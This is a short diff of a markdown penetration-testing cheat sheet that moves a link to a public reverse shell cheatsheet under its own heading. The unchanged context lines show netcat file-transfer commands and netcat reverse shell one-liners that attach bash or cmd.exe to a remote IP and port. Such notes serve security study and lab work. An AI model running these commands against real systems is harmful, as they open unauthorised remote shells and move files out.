@@ -24,13 +24,15 @@ Download: <code>nc -lnvp [PORT] > [OUT_FILE]</code>
 
 Upload: <code>nc -nv [IP] [PORT] < [IN_FILE]</code>
 
-[Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-
 ### Netcat
 
 Linux: <code>nc -nv [IP] [PORT] -e /bin/bash</code>
 
 Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
+
+### Reverse Shells
+
+[Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ### Upgrading Reverse Shells
 
